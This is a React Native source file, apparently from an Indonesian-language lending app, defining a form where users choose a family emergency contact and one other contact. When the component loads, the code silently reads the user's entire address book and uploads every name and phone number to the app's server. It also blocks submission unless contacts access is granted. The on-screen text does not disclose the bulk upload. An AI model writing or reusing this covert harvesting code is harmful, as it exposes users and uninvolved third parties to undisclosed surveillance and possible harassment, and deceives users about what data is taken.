import React, { Component } from 'react';
import { View, Text, TextInput, TouchableOpacity, Image, Alert, StyleSheet } from 'react-native';

import Contacts from 'react-native-contacts';
import Pinyin from 'pinyin';
import Permissions from 'react-native-permissions';
import Toast from 'react-native-root-toast';

import { PR } from './../../assets/css/AppStyles';

import { AxiosPost } from './../../api';

import AuthSelectModel from './AuthSelectModel';
import ContactModel from './ContactModel';

class AuthContactModel extends Component {
    constructor(props) {
        super(props);

        this.authType = this.props.authType;
        this.option = this.props.option;
        this.doAction = this.props.doAction;

        this._selectAction = this._selectAction.bind(this);
        this._contactAction = this._contactAction.bind(this);

        this.contacts = []; // 联系人数据

        this.state = {
            platform_id: this.props.platformId,
            selectOption: null,
            selectKey: '',
            selectTitle: '',
            showSelect: false,
            showContact: false,
            contactKey: '',
            contactList: [],
            contactIndex: '',
            permissionsState: true
        };
    }

    componentDidMount() {
        this._getAuthInfo(); // 获取认证回显信息
        this._getContacts(); // 获取通讯录权限
    }

    componentWillUnmount() {}

    _getAuthInfo() {
        AxiosPost('/auth/info', {
            para: { auth_type: this.authType, platform_id: this.state.platform_id }
        }).then(res => {
            let { code, response } = res;
            if (code === 0) {
                // 直系亲属关系
                let direct_relationLabel = '';
                this.option.direct_relationOption.map(item => {
                    if (item.value === response.direct_relation) {
                        direct_relationLabel = item.label;
                    }
                })

                // 其他联系人关系
                let other_relationLabel = '';
                this.option.other_relationOption.map(item => {
                    if (item.value === response.other_relation) {
                        other_relationLabel = item.label;
                    }
                })

                let directValue = '';
                if (response.direct_phone) {
                    directValue = `${response.direct_name} ${response.direct_phone}`
                }

                let otherValue = '';
                if (response.other_phone) {
                    otherValue = `${response.other_name} ${response.other_phone}`
                }

                this.setState(Object.assign({}, response, {
                    directValue,
                    direct_relationLabel,
                    otherValue,
                    other_relationLabel,
                }));
            }
        })
    }

    _getContacts() {
        // 获取通讯录权限
        Permissions.request('contacts').then(response => {
            if (response !== 'authorized') {
                this.setState({
                    permissionsState: false
                });

                Alert.alert(
                    'Terapkan',
                    'Izin ini diperlukan untuk membuka buku telepon',
                    [
                        {
                            text: 'Batal',
                            style: 'cancel'
                        },
                    ]
                )
            } else {
                Contacts.getAll((err, contacts) => {
                    if (err) throw err;

                    this.setState({
                        permissionsState: true
                    });

                    if (contacts.length > 0) {
                        let { mobileBook, info } = this._formatContacts(contacts); // 格式化通讯录数据
                        this.contacts = mobileBook; // 格式化通讯录数据

                        this._addDeviceInfo({ type: 4, info });
                    }
                })
            }
        })
    }

    _formatContacts(data) { // 格式化通讯录数据
        let mobileBook = [];
        let info = [];
        let reg = /^[a-z]/;

        // 提取可用数据
        data.map((item) => {
            let name = '';
            let phone = [];
            let title = '';

            // 姓名
            if (item.givenName) {
                name = item.givenName;
            }

            if (item.middleName) {
                name = `${name} ${item.middleName}`;
            }

            if (item.familyName) {
                name = `${name} ${item.familyName}`;
            }

            // 电话
            item.phoneNumbers.map((value) => {
                let num = value.number.replace(/[^0-9]/ig, ''); // 去掉非数字
                if (num) {
                    phone.push(num);
                }
            })

            if (name && phone.length > 0) {
                // 索引
                let initials = Pinyin(name.substr(0, 1), {
                    style: Pinyin.STYLE_FIRST_LETTER
                });
                if (initials[0] && initials[0][0] && reg.test(initials[0][0])) {
                    title = initials[0][0].toUpperCase();
                }

                mobileBook.push({ name, phone, title });
            }
        });

        // 按字母表排序
        mobileBook.sort((a, b) => {
            return a.title.localeCompare(b.title);
        });

        mobileBook.map(val1 => {
            val1.phone.map(val2 => {
                info.push(`${val1.name}_${val2}`)
            })
        });

        return { mobileBook, info };
    }

    _formatContacts2(data) {
        let initials = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '*'];
        let result = [];
        initials.map(val1 => {
            let obj = {
                title: val1,
                data: []
            }
            if (val1 !== '*') {
                data.map(val2 => {
                    if (val2.title === val1) {
                        obj.data.push({
                            name: val2.name,
                            phone: val2.phone
                        })
                    }
                })
            } else {
                data.map(val2 => {
                    if (val2.title < 'A' || val2.title > 'Z') {
                        obj.data.push({
                            name: val2.name,
                            phone: val2.phone
                        })
                    }
                })
            }

            if (obj.data.length > 0) {
                result.push(obj)
            }
        })

        return result;
    }

    _addDeviceInfo(para) {
        AxiosPost('/auth/add-device-info', { para });
    }

    _showSelect(selectKey, selectTitle, selectValue) {
        this.setState({
            selectOption: this.option[`${selectKey}Option`],
            selectKey,
            selectTitle,
            selectValue,
            showSelect: true
        });
    }

    _selectAction(key, item) {
        let state = {
            showSelect: false
        };

        if (item) {
            state[key] = item.value;
            state[`${key}Label`] = item.label
        }

        this.setState(state);
    }

    _selectContact(key) {
        let newArray = [];
        this.contacts.map(val1 => {
            val1.phone.map(val2 => {
                newArray.push({
                    name: val1.name,
                    phone: val2,
                    title: val1.title
                })
            })
        })

        let contactList = this._formatContacts2(newArray);

        this.setState({
            contactList,
            contactIndex: contactList[0] && contactList[0].title,
            showContact: true,
            contactKey: key
        });
    }

    _contactAction(key, item) {
        let object = {
            showContact: false,
        };

        if (key) {
            if (key === 'select') {
                if (this.state.contactKey === 'direct') {
                    object.direct_name = item.name;
                    object.direct_phone = item.phone;
                    object.directValue = `${item.name} ${item.phone}`;
                }

                if (this.state.contactKey === 'other') {
                    object.other_name = item.name;
                    object.other_phone = item.phone;
                    object.otherValue = `${item.name} ${item.phone}`;
                }
            }

            if (key === 'change') {
                object.showContact = true;
                object.contactIndex = item.title;
            }
        }

        this.setState(object);
    }

    _doSubmit() {
        if (!this.state.permissionsState) {
            Toast.show('Perlu mendapatkan akses ke buku alamat telepon', { duration: 4000 });
            return false;
        }

        if (!this.state.direct_relation) {
            Toast.show('Silahkan pilih kontak keluarga langsung', { duration: 4000 });
            return false;
        }

        if (!this.state.direct_name || !this.state.direct_phone) {
            Toast.show('Silahkan pilih kontak darurat keluarga langsung', { duration: 4000 });
            return false;
        }

        if (!this.state.other_relation) {
            Toast.show('Silahkan pilih hubungan kontak lain', { duration: 4000 });
            return false;
        }

        if (!this.state.other_name || !this.state.other_phone) {
            Toast.show('Silahkan pilih kontak lain', { duration: 4000 });
            return false;
        }

        if (this.state.direct_phone === this.state.other_phone) {
            Toast.show('Jangan pilih 2 kontak darurat yang identik, silahkan pilih kembali', { duration: 4000 });
            return false;
        }

        AxiosPost('/auth/contact', {
            para: this.state
        }).then(res => {
            let { code, message } = res;
            Toast.show(message, { duration: 4000 });
            if (code === 0) {
                this.doAction(this.authType);
            }
        })
    }

    render() {
        return (
            <View style={styles.authModel}>
                <View style={styles.authHint}>
                    <Image style={styles.authHintIcon} source={require('./../../assets/img/icon_hint.png')} />
                    <Text style={styles.authHintText}>Kontak keluarga dekat</Text>
                </View>
                <View style={styles.authItem}>
                    <Text style={styles.authItemText}><Image source={require('./../../assets/img/icon_dot.png')} style={styles.authItemDot} /> Hubungan Dengan Saya</Text>
                    <TouchableOpacity activeOpacity={1} style={styles.authItemSelect} onPress={() => this._showSelect('direct_relation', 'Hubungan Dengan Saya', this.state.direct_relation)}>
                        <TextInput editable={false} style={styles.authItemValueText} value={this.state.direct_relationLabel} placeholder='Silahkan Pilih' />
                        <Image style={styles.authItemArrow} source={require('./../../assets/img/icon_arrow3.png')} />
                    </TouchableOpacity>
                </View>
                <View style={styles.authItem}>
                    <Text style={styles.authItemText}><Image source={require('./../../assets/img/icon_dot.png')} style={styles.authItemDot} /> Kontak Darurat</Text>
                    <TouchableOpacity activeOpacity={1} style={styles.authItemSelect} onPress={() => this._selectContact('direct')}>
                        <TextInput editable={false} style={styles.authItemValueText} value={this.state.directValue} placeholder='Silahkan Pilih' />
                        <Image style={styles.authItemArrow} source={require('./../../assets/img/icon_arrow3.png')} />
                    </TouchableOpacity>
                </View>
                <View style={styles.authHint}>
                    <Image style={styles.authHintIcon} source={require('./../../assets/img/icon_hint.png')} />
                    <Text style={styles.authHintText}>Kontak lainnya</Text>
                </View>
                <View style={styles.authItem}>
                    <Text style={styles.authItemText}><Image source={require('./../../assets/img/icon_dot.png')} style={styles.authItemDot} /> Hubungan Dengan Saya</Text>
                    <TouchableOpacity activeOpacity={1} style={styles.authItemSelect} onPress={() => this._showSelect('other_relation', 'Hubungan Dengan Saya', this.state.other_relation)}>
                        <TextInput editable={false} style={styles.authItemValueText} value={this.state.other_relationLabel} placeholder='Silahkan Pilih' />
                        <Image style={styles.authItemArrow} source={require('./../../assets/img/icon_arrow3.png')} />
                    </TouchableOpacity>
                </View>
                <View style={styles.authItem}>
                    <Text style={styles.authItemText}><Image source={require('./../../assets/img/icon_dot.png')} style={styles.authItemDot} /> Kontak Darurat</Text>
                    <TouchableOpacity activeOpacity={1} style={styles.authItemSelect} onPress={() => this._selectContact('other')}>
                        <TextInput editable={false} style={styles.authItemValueText} value={this.state.otherValue} placeholder='Silahkan Pilih' />
                        <Image style={styles.authItemArrow} source={require('./../../assets/img/icon_arrow3.png')} />
                    </TouchableOpacity>
                </View>
                <TouchableOpacity activeOpacity={1} style={styles.submitAction} onPress={() => this._doSubmit()}>
                    <Text style={styles.submitText}>KIRIM</Text>
                </TouchableOpacity>
                <AuthSelectModel
                    data={this.state.selectOption}
                    state={this.state.showSelect}
                    selectKey={this.state.selectKey}
                    selectValue={this.state.selectValue}
                    title={this.state.selectTitle}
                    doAction={this._selectAction}
                />
                <ContactModel
                    data={this.state.contactList}
                    state={this.state.showContact}
                    activeIndex={this.state.contactIndex}
                    doAction={this._contactAction}
                />
            </View>
        );
    }
}

const styles = StyleSheet.create({
    authModel: {
        marginHorizontal: PR * 20,
        paddingBottom: PR * 20,
    },
    authHint: {
        marginTop: PR * 10,
        marginBottom: PR * 20,
        paddingVertical: PR * 15,
        paddingLeft: PR * 40,
        paddingRight: PR * 15,
        borderRadius: PR * 6,
        backgroundColor: '#FFF8E0',
    },
    authHintText: {
        fontSize: PR * 12,
        color: '#FCCF33',
        lineHeight: PR * 15,
    },
    authHintIcon: {
        position: 'absolute',
        top: PR * 15,
        left: PR * 15,
        width: PR * 16,
        height: PR * 16,
    },
    authItem: {
        marginBottom: PR * 15,
    },
    authItemText: {
        color: '#ADD5C7',
        fontSize: PR * 15,
        fontWeight: 'bold',
    },
    authItemDot: {
        width: PR * 6,
        height: PR * 6,
    },
    authItemValue: {
        height: PR * 48,
        textAlignVertical: 'center',
        borderBottomWidth: PR * 1,
        borderBottomColor: '#F2F2F2',
        fontSize: PR * 15,
        color: '#333',
        paddingHorizontal: PR * 10,
    },
    authItemSelect: {
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'space-between',
        height: PR * 48,
        borderBottomWidth: PR * 1,
        borderBottomColor: '#F2F2F2',
        paddingHorizontal: PR * 10,
    },
    authItemValueText: {
        flex: 1,
        fontSize: PR * 15,
        color: '#333',
    },
    authItemArrow: {
        width: PR * 6,
        height: PR * 9,
    },
    submitAction: {
        backgroundColor: '#24D29B',
        borderRadius: PR * 48,
    },
    submitText: {
        color: '#fff',
        fontSize: PR * 17,
        textAlign: 'center',
        lineHeight: PR * 48,
    },
})

export default AuthContactModel;